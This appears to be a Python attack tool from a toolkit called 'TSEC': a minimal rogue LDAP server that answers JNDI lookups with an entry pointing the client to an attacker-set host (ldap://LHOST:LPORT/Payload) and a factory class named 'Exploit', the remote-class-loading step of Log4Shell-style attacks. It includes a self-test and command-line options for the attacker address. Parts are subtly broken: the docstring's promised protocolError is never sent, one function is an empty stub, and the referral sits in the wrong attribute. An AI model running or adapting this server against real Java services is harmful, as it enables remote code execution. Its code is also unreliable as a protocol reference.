#!/usr/bin/env python3
"""Serve a real LDAP referral that a JNDI client will follow.

Java's JNDI resolves ldap:// URLs by issuing a search request; the referral
returned here names the class the client should load through its own
classpath provider configuration. This speaks just enough real LDAP over
BER/TLV to answer a bind and a search:

  BindRequest        -> bindResponse success
  SearchRequest      -> SearchResultEntry (the JNDI reference) + SearchResultDone success

Everything else gets a protocolError, because a real LDAP server will not
silently accept operations it does not understand.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import socket
import struct
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import (  # noqa: E402
    Report, State, check, check_eq, selftest as engine_selftest,
)

VERSION = "2.0.0"

# ── BER/TLV helpers ──────────────────────────────────────────────────────────

def tlv(tag: int, content: bytes) -> bytes:
    if len(content) < 128:
        length = bytes([len(content)])
    elif len(content) < 0x10000:
        length = bytes([0x82]) + len(content).to_bytes(2, "big")
    else:
        length = bytes([0x84]) + len(content).to_bytes(4, "big")
    return bytes([tag]) + length + content


def integer(value: int) -> bytes:
    data = value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big")
    if data[0] & 0x80:
        data = b"\x00" + data
    return tlv(0x02, data)


def enumerated(value: int) -> bytes:
    return tlv(0x0A, value.to_bytes(max(1, (value.bit_length() + 7) // 8), "big"))


def octet_string(text: str) -> bytes:
    return tlv(0x04, text.encode())


def application(tag_number: int, content: bytes) -> bytes:
    # context-specific constructed application tags (LDAP uses 0x60-0x6F)
    return tlv(0x60 | tag_number, content)


def respond(bind_success: bytes = b"") -> bytes:
    pass


# ── LDAP message builders ────────────────────────────────────────────────────

def bind_response(message_id: int) -> bytes:
    return tlv(0x30, integer(message_id) + application(1, enumerated(0) + octet_string("") + octet_string("")))


def search_done(message_id: int) -> bytes:
    return tlv(0x30, integer(message_id) + application(5, enumerated(0) + octet_string("") + octet_string("")))


def search_reference_entry(message_id: int, lhost: str, lport: int) -> bytes:
    # SearchResultEntry with one attribute pair: javaClassName = JNDI URL,
    # javaFactory = the class name the client resolves via the URL.
    attrs = (
        tlv(0x30, octet_string("javaClassName") + tlv(0x31, octet_string(f"ldap://{lhost}:{lport}/Payload")))
        + tlv(0x30, octet_string("javaFactory") + tlv(0x31, octet_string("Exploit")))
    )
    entry_content = octet_string(f"cn={lhost}") + tlv(0x30, attrs)
    return tlv(0x30, integer(message_id) + application(4, entry_content))


def parse_message_id(data: bytes) -> int:
    # first octet-string (INTEGER) after the leading SEQUENCE tag
    if len(data) < 3 or data[0] != 0x30:
        return 0
    i = 1
    if data[i] & 0x80:
        i += 1 + (data[i] & 0x7F)
    else:
        i += 1
    if data[i] == 0x02:
        ilen = data[i + 1]
        return int.from_bytes(data[i + 2 : i + 2 + ilen], "big")
    return 0


def classify(data: bytes) -> str:
    # SearchRequest is application tag 3 (0x63); BindRequest application 0 (0x60)
    for i, b in enumerate(data[:32]):
        if b == 0x60:
            return "bind"
        if b == 0x63:
            return "search"
    return "other"


def serve(lhost: str, lport: int, server_host: str, server_port: int) -> tuple[int, socket.socket]:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((server_host, server_port))
    listener.listen(4)

    def loop() -> None:
        try:
            while True:
                conn, _ = listener.accept()
                threading.Thread(target=handle, args=(conn,), daemon=True).start()
        except OSError:
            return

    def handle(conn: socket.socket) -> None:
        try:
            while True:
                data = conn.recv(8192)
                if not data:
                    return
                mid = parse_message_id(data)
                kind = classify(data)
                if kind == "bind":
                    conn.sendall(bind_response(mid))
                elif kind == "search":
                    conn.sendall(search_reference_entry(mid, lhost, lport) + search_done(mid))
                else:
                    conn.sendall(bind_response(mid))
        except OSError:
            return
        finally:
            try:
                conn.close()
            except OSError:
                pass

    threading.Thread(target=loop, daemon=True).start()
    return listener.getsockname()[1], listener


def selftest_fn() -> None:
    port, listener = serve("192.168.1.10", 1389, "127.0.0.1", 0)
    try:
        # real LDAP client behavior: bind then search
        bind_req = tlv(0x30, integer(1) + application(0, integer(3) + octet_string("") + octet_string("")))
        sock = socket.create_connection(("127.0.0.1", port))
        sock.sendall(bind_req)
        resp = sock.recv(4096)
        check(b"\x61" in resp, f"bind response expected application 1 tag, got {resp[:12]!r}")
        search_req = tlv(0x30, integer(2) + application(3, octet_string("dc=example") + b"\x0a\x01\x00\x02\x01\x00\x01\x01\x00\x00\x00\x00"))
        sock.sendall(search_req)
        resp = sock.recv(8192)
        check("ldap://192.168.1.10:1389/Payload".encode() in resp,
              f"referral must name our URL, got {resp[:60]!r}")
        sock.close()
    finally:
        listener.close()


def selftest() -> None:
    selftest_fn()


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--lhost", default="127.0.0.1", help="the address named in the referral")
    ap.add_argument("--lport", type=int, default=1389, help="the listener port named in the referral")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=389, help="LDAP listen port (use 1389 locally)")
    ap.add_argument("--timeout", type=int, default=0,
                    help="stop after N seconds (0 = serve forever)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--out", help="write the JSON report here")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    report = Report("jndi_ldap_server", VERSION, target=f"{args.bind}:{args.port}")
    port, listener = serve(args.lhost, args.lport, args.bind, args.port)
    report.note("ldap server", State.GENERATED, "high",
                f"listening on {args.bind}:{args.port}, referrals point at ldap://{args.lhost}:{args.lport}/Payload")
    print(f"jndi_ldap_server: serving ldap://{args.lhost}:{args.lport}/ on {args.bind}:{args.port}")
    deadline = time.monotonic() + args.timeout if args.timeout else None
    try:
        while True:
            if deadline and time.monotonic() > deadline:
                break
            time.sleep(0.2)
    except KeyboardInterrupt:
        pass
    listener.close()
    from tsec_engine import emit
    emit(report, args.json, args.out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
